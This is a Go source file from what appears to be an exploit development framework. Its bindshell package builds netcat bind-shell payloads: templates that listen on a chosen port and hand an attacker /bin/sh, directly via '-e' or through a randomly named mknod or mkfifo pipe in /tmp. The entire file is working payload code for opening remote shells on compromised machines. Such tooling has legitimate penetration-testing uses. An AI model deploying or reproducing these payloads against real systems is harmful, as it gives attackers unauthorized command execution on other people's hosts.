package bindshell

import (
	"fmt"

	"github.com/vulncheck-oss/go-exploit/random"
)

const (
	NetcatDefault = "nc -l -p %d -e /bin/sh"
	NetcatMknod   = `cd /tmp; mknod %s p; nc -l -p %d 0<%s | /bin/sh >%s 2>&1; rm %s;`
	NetcatMkfifo  = `cd /tmp; mkfifo %s; nc -l -p %d 0<%s | /bin/sh >%s 2>&1; rm %s;`
)

func (nc *NetcatPayload) Default(bport int) string {
	return nc.Gaping(bport)
}

func (nc *NetcatPayload) Gaping(bport int) string {
	return fmt.Sprintf(NetcatDefault, bport)
}

func (nc *NetcatPayload) Mknod(bport int) string {
	node := random.RandLetters(3)

	return fmt.Sprintf(NetcatMknod, node, bport, node, node, node)
}

func (nc *NetcatPayload) Mkfifo(bport int) string {
	fifo := random.RandLetters(3)

	return fmt.Sprintf(NetcatMkfifo, fifo, bport, fifo, fifo, fifo)
}
